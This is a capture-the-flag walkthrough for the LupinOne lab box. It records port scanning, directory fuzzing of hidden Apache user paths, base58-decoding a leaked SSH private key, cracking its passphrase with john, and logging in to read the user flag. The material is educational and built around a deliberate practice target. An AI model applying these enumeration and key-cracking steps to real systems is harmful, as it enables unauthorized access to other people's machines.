# Empire: LupinOne — Walkthrough Notes

Target: `192.168.122.236`

The whole box is an enumeration puzzle. Each step hides the next one a
different way: a decoy path, a tilde `~user` path, a dotfile, an encoding, and
a passphrase. Miss any one technique and you see nothing.

---

## 1. Recon — port scan

```bash
nmap -sC -sV -p- 192.168.122.236
```

- **22** — OpenSSH 8.4p1 (Debian)
- **80** — Apache httpd 2.4.48 (Debian)
- `robots.txt` disallows `/~myfiles`

> **Lesson:** use `-p-` for all 65535 ports, not just `1-1000`. However here i used 1-1000 since my guts say so --> :)

---

## 2. Recon — web enumeration (root)

```bash
gobuster dir -u http://192.168.122.236/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

Only `image/`, `manual/`, `javascript/`, `robots.txt`. Nothing useful at root except that robots.txt gave me a hints for /~myfiles/ same as nmap.

> **Lesson:** `-x` appends extensions. Without it gobuster only requests bare words. Use the `2.3-medium` list, not the weak `1.0`.

---

## 3. Follow the robots.txt lead → hit the decoy

Visited `/~myfiles/` → fake **404**. Viewed the **raw page source**:

```html
<!-- Your can do it, keep trying. -->
```

A hand-written comment in a 404 = the author saying this is a dead end.

> **Lesson:** always read raw page source. A 404 can carry hints. robots.txt entries are sometimes misdirection, not treasure.

---

## 4. Recognize the `~user` pattern → fuzz siblings

The `~` in `~myfiles` is Apache **`mod_userdir`**. If one `~user` exists, others might. Prepend the tilde and fuzz:

```bash
ffuf -u 'http://192.168.122.236/~FUZZ/' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fc 404
```

Found **`/~secret/`**.

> **Lesson:** a `~user` path signals "hunt for more `~users`." A normal wordlist requests `secret`, not `~secret` — put the `~` in the URL template yourself.

---

## 5. Find the hidden dotfile inside `/~secret/`

Misses return a ~331-byte fake-404 with **HTTP 200** (not 403), so status filtering does nothing. Filter by **size**:

```bash
# confirm junk size with a deliberate miss:
curl -s http://192.168.122.236/~secret/.doesnotexist.txt | wc -c   # -> 331

ffuf -u 'http://192.168.122.236/~secret/.FUZZ.txt' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 331
```

Found **`.mysecret.txt`** (size 4689).

> **Lesson:** when misses are all the same size, filter by `-fs <size>`, not status. Dotfiles need the `.` baked into the fuzz pattern (`.FUZZ.txt`).

---

## 6. Download and identify the encoding

```bash
curl http://192.168.122.236/~secret/.mysecret.txt > .mysecret.txt
```

Blob = letters + digits only, **no `+` `/` `=`**, and no `0 O I l` → **base58** (not base64).

> **Lesson:** ID an encoding by its character set before reaching for a tool. base64 has `+ / =`; base58 has none and omits the ambiguous characters.

---

## 7. Decode base58 → SSH private key

```bash
pip install base58
python3 -c "import base58; open('arsene_key','wb').write(base58.b58decode(open('.mysecret.txt').read().strip()))"
head -1 arsene_key          # -----BEGIN OPENSSH PRIVATE KEY-----
chmod 600 arsene_key
echo >> arsene_key          # ensure trailing newline (see lesson)
```

> **Lessons:**
> - `.write()` returns a byte count, so `print(open(...).write(...))` shows a number like `3433` — that's success, not an error.
> - **Trailing newline matters.** A key missing the final newline fails with `Load key "arsene_key": invalid format` — SSH never even reaches the passphrase. `echo >> arsene_key` fixes it.
> - `chmod 600` is mandatory (gives a *different* error if skipped: "UNPROTECTED PRIVATE KEY FILE").
> - Decode to a file on the box, not via an in-browser decoder — copy/paste mangles whitespace.

---

## 8. Crack the key passphrase

The key is passphrase-protected (two-factor by design: the file alone isn't enough).

```bash
ssh2john arsene_key > key.hash
#   (binary lives at /usr/sbin/john on this Kali — john-avx512bw-omp, the jumbo build)

# full rockyou at ~37 p/s is pointless on bcrypt-pbkdf. Use a small curated list first:
john --wordlist=/usr/share/wordlists/fasttrack.txt --rules=jumbo key.hash
john --show key.hash
```

Result: **`P@55w0rd!`** — cracked in ~3s.

> **Lessons:**
> - bcrypt-pbkdf is deliberately slow (~37 p/s here even on 8 cores at 99% — that's normal, not broken). Don't brute full rockyou; hit common words early.
> - `fasttrack.txt` is a tiny curated CTF/default-password list — try it (and `head -N rockyou`) before the 14M-word monster.
> - `P@55w0rd!` is "Password!" leetspeak'd — that's why plain rockyou missed and `--rules` / a curated list mattered.
> - `*2john` pattern is universal: `ssh2john`, `zip2john`, `rar2john`, `office2john` all extract a crackable hash from a password-protected file.

---

## 9. Find the real username → SSH in → user flag

Printing the public key leaks who the key belongs to:

```bash
ssh-keygen -y -P 'P@55w0rd!' -f arsene_key
# ...ends with:  icex64@LupinOne
```

The login user is **`icex64`**, NOT `arsene`. The `.jpg`-based guess was wrong; the key comment gave the real answer.

> **Lesson:** the `user@host` comment at the end of a public key is a free username leak. Check it with `ssh-keygen -y` instead of guessing.

```bash
ssh -i arsene_key icex64@192.168.122.236     # passphrase: P@55w0rd!
cat user.txt
id
```
